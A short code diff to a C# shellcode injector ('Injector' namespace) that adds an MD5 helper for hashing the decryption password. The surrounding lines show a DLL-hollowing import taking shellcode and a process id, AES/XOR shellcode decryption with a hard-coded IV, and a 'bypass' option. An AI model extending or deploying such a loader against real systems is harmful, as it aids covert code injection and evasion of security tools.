@@ -361,6 +361,24 @@ namespace Injector
         [DllImport(phantom, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
         static extern int dll_hollow(byte[] shellcode, int size, int pid);
 
+        public static string CreateMD5(string input)
+        {
+            // Use input string to calculate MD5 hash
+            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
+            {
+                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
+                byte[] hashBytes = md5.ComputeHash(inputBytes);
+
+                // Convert the byte array to hexadecimal string
+                StringBuilder sb = new StringBuilder();
+                for (int i = 0; i < hashBytes.Length; i++)
+                {
+                    sb.Append(hashBytes[i].ToString("X2"));
+                }
+                return sb.ToString();
+            }
+        }
+        
         static byte[] aes_decryption(byte[] shellcode, string password)
         {
             string iv = "1234567891234567";
@@ -735,11 +753,13 @@ namespace Injector
             {
                 decryption = 1;
                 pass = arguments.Single("pass");
+                pass = CreateMD5(pass);
             }
             else if (arguments.Exists("decrypt-aes"))
             {
                 decryption = 2;
                 pass = arguments.Single("pass");
+                pass = CreateMD5(pass);
             }
 
             if (arguments.Exists("bypass"))
